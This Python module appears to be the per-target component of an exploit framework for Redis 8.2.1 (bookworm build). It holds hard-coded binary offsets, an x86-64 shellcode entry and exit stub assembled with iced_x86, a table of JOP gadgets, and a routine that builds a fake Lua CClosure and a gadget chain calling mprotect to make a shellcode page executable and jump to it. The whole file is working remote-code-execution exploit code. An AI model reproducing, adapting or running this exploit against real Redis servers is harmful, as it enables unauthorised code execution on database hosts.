from __future__ import annotations
from iced_x86 import (
    BlockEncoder,
    Code,
    Instruction as Instr,
    MemoryOperand,
    Register,
)
from typing import Optional, Tuple

from .shared import (
    CClosure,
    CoreAddrs,
    ExploitState,
    ShellcodeContext,
    TargetInfo,
)
from .util import u32_le, u64_le

def info() -> TargetInfo:
    return TargetInfo(
        name='redis:8.2.1-bookworm',
        redis_version='8.2.1',
        redis_build_id='fcae35583392417f',
    )

def core_addrs(luaAlloc: int) -> Optional[CoreAddrs]:
    if luaAlloc & 0xFFF != 0xE10:
        return None
    redis_base = luaAlloc - 0x21BE10
    mprotect = redis_base + 0x7F0D0
    pthread_create = redis_base + 0x80398
    return CoreAddrs(
        luaAlloc=luaAlloc,
        redis_base=redis_base,
        mprotect=mprotect,
        pthread_create=pthread_create,
    )

def create_shellcode(context: ShellcodeContext, shellcode: bytes, shellcode_body_address: int) -> Optional[Tuple[bytes, int]]:
    """Shellcode entry/exit stub for `redis:8.2.1-bookworm`."""
    # Call `addReplyBool(client*, true)` to inform client socket that it can close.
    addReplyBool = context.addrs.redis_base + 0xD6890

    # Redis `curr_run_ctx` should be set to 0.
    curr_run_ctx = context.addrs.redis_base + 0x4088C8

    # Remember entry into shellcode stub.
    entry = len(shellcode)

    # Entry/exit stubs for shellcode for `redis:8.2.1` target.
    # These instructions aren't space effecient but we aren't very space constrained. :)
    instrs = [
        # Fix RBP/RSP registers.
        Instr.create_reg_reg(Code.MOV_RM64_R64, Register.RBP, Register.RSP),
        Instr.create_reg_i32(Code.ADD_RM64_IMM32, Register.RBP, 0x420),
        Instr.create_reg_i32(Code.ADD_RM64_IMM32, Register.RSP, 0x378),

        # Call shellcode body.
        # Assume standard-ish calling convention?
        Instr.create_reg_i64(Code.MOV_R64_IMM64, Register.RAX, shellcode_body_address),
        Instr.create_reg(Code.CALL_RM64, Register.RAX),

        # For debugging:
        # break *(evalGenericCommand+672)

        # Returning into: `evalGenericCommand`
        # Call `addReplyBool(client*, true)`
        Instr.create_reg_mem(Code.MOV_R64_RM64, Register.RDI, MemoryOperand(Register.RSP, displ=0xA0)),
        Instr.create_reg_i32(Code.MOV_R8_IMM8, Register.SIL, 1),
        Instr.create_reg_i64(Code.MOV_R64_IMM64, Register.RAX, addReplyBool),
        Instr.create_reg(Code.CALL_RM64, Register.RAX),
        # Set: RBX = lua_State*
        Instr.create_reg_i64(Code.MOV_R64_IMM64, Register.RBX, context.luastate),
        # Set: curr_run_ctx = NULL
        Instr.create_reg_reg(Code.XOR_RM64_R64, Register.RCX, Register.RCX),
        Instr.create_reg_i64(Code.MOV_R64_IMM64, Register.RDX, curr_run_ctx),
        Instr.create_mem_reg(Code.MOV_RM64_R64, MemoryOperand(Register.RDX), Register.RCX),
        # Ensure RAX is non-zero.
        Instr.create_reg_i32(Code.MOV_R8_IMM8, Register.AL, 1),
        # iced-x86 won't let us emit RET here, so do it below.
        # Instr.create(Code.RETND),
    ]

    # TODO: Actually clean up after ourselves?

    encoder = BlockEncoder(64)
    encoder.add_many(instrs)
    encoded_bytes = encoder.encode(0) + b'\xC3'

    shellcode += encoded_bytes

    return (shellcode, entry)

class jop(object):
    """JOP gadgets for `redis:8.2.1-bookworm` build."""
    # mov rbx, rax ; mov rdi, rax ; call qword ptr [rax + 0x30]
    mov_rbx_rax__mov_rdi_rax__call_qword_ptr_rax_plus_0x30 = 0x1451ac

    # mov rdx, qword ptr [rdi + 0x18] ; mov rdi, qword ptr [rdi] ; call qword ptr [rax + 0x28]
    mov_rdx_qword_ptr_rdi_p_0x18__mov_rdi_qword_ptr_rdi__call_qword_ptr_rax_p_0x28 = 0x1c83cf

    # mov rsi, rdi ; mov rdi, r13 ; call qword ptr [rax + 0x10]
    mov_rsi_rdi__mov_rdi_r13__call_qword_ptr_rax_p_0x10 = 0x24da07

    # add al, 0x24 ; mov rdi, qword ptr [r12 + 8] ; call qword ptr [rax + 0x38]
    add_al_0x24__mov_rdi_qword_ptr_r12_p_0x8__call_qword_ptr_rax_p_0x38 = 0xe89c2

    # add al, 0x4c ; mov dword ptr [rbx], ecx ; sub r9, r12 ; call qword ptr [rbx + 0x68]
    add_al_0x4c__mov_dword_ptr_rbx_ecx__sub_r9_r12__call_qword_ptr_rbx_p_0x68 = 0x21549d

    # mov rdi, qword ptr [rbx + 8] ; call qword ptr [rbx]
    mov_rdi_qword_ptr_rbx_p_0x8__call_qword_ptr_rbx = 0x1c6ac9

    # This one is kinda long lol.
    call_trampoline = 0xd1a6d

    # mov rax, qword ptr [rax + 0x80] ; jmp rax
    mov_rax_qword_ptr_rax_p_0x80__jmp_rax = 0xf21f1

def build_pivot_payload(state: ExploitState) -> Tuple[bytes, bytes]:
    redis_base = state.addrs.redis_base

    mprotect_arg_addr = state.shellcode_page
    mprotect_arg_size = 0x1000
    mprotect_arg_prot = 7

    # Gadgets.
    gadget0 = redis_base + jop.mov_rbx_rax__mov_rdi_rax__call_qword_ptr_rax_plus_0x30
    gadget1 = redis_base + jop.mov_rdx_qword_ptr_rdi_p_0x18__mov_rdi_qword_ptr_rdi__call_qword_ptr_rax_p_0x28
    gadget2 = redis_base + jop.mov_rsi_rdi__mov_rdi_r13__call_qword_ptr_rax_p_0x10
    gadget3 = redis_base + jop.add_al_0x24__mov_rdi_qword_ptr_r12_p_0x8__call_qword_ptr_rax_p_0x38
    gadget4 = redis_base + jop.add_al_0x4c__mov_dword_ptr_rbx_ecx__sub_r9_r12__call_qword_ptr_rbx_p_0x68
    gadget5 = redis_base + jop.mov_rdi_qword_ptr_rbx_p_0x8__call_qword_ptr_rbx
    gadget6 = redis_base + jop.call_trampoline
    gadget7 = redis_base + jop.mov_rax_qword_ptr_rax_p_0x80__jmp_rax

    # Build CClosure.
    # RIP pivot has RAX pointing to our CClosure, so some JOP details are intertwined here.
    cclosure = CClosure(
        p_gclist=gadget3,
        p_env=mprotect_arg_prot,
        p_function=gadget0)
    cclosure_bytes = cclosure.build(next=mprotect_arg_size)
    assert(len(cclosure_bytes) == 0x28)

    # Build the JOP-specific parts of the megabin.
    jopdata = b''
    jopdata += u64_le(gadget2) # Base + 0x28
    jopdata += u64_le(gadget1) # Base + 0x30
    jopdata += b'\x00' * 0x10  # Base + 0x38
    jopdata += u32_le(0x50)    # Base + 0x48
    jopdata += b'\x00' * 0x10  # Base + 0x4C
    jopdata += u64_le(gadget3) # Base + 0x5C
    jopdata += b'\x00' * 0x4   # Base + 0x64
    jopdata += u64_le(gadget0) # Base + 0x68
    jopdata += b'\x00' * 0x10  # Base + 0x70
    jopdata += u64_le(gadget4) # Base + 0x80
    jopdata += b'\x00' * 0xC   # Base + 0x88
    jopdata += u64_le(gadget6) # Base + 0x94
    jopdata += u64_le(mprotect_arg_addr) # Base + 0xA0
    # NOTE: Loaded into RDI, then: `CALL qword ptr [[RDI] + 0x60]`
    # Let's just have it call via [Base + 0xB0] -> [Base + 0xB8]?
    jopdata += u64_le(state.megabin_address + 0x50 + 0xB0) # Base + 0xA4
    jopdata += b'\x00' * 0x4 # Base + 0xAC
    jopdata += u64_le(state.megabin_address + 0x50 + (0xB8 - 0x60)) # Base + 0xB0
    jopdata += u64_le(state.shellcode_entry) # Base + 0xB8
    jopdata += b'\x00' * 0x4   # Base + 0xC0
    jopdata += u64_le(gadget5) # Base + 0xC4
    jopdata += b'\x00' * 0x20  # Base + 0xCC
    jopdata += u64_le(gadget7) # Base + 0xEC
    jopdata += b'\x00' * 0x20  # Base + 0xF4
    jopdata += u64_le(state.addrs.mprotect) # Base + 0x114
    assert(len(jopdata) == (0x11C - 0x28))

    return (cclosure_bytes, jopdata)
